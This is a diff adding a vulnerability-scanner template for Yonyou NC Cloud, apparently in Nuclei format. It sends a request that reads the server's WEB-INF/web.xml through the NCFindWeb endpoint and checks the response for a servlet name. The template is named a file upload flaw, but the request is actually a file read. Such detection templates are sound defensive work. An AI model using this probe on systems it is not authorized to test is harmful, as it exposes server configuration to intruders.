@@ -1,0 +1,33 @@
+id: yonyou-nc-cloud-file-upload
+
+info:
+  name: Yonyou NC Cloud Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects arbitrary file upload leading to potential sensitive information exposure in Yonyou NC Cloud.
+  reference:
+    - https://github.com/Cl0udG0d/edusrc_POC/blob/master/%E7%94%A8%E5%8F%8BERP-NC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABPOC.py
+
+http:
+  - raw:
+      - |
+        GET /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/xml
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+
+      - type: regex
+        part: body
+        regex:
+          - "<servlet-name>NCInvokerServlet</servlet-name>"
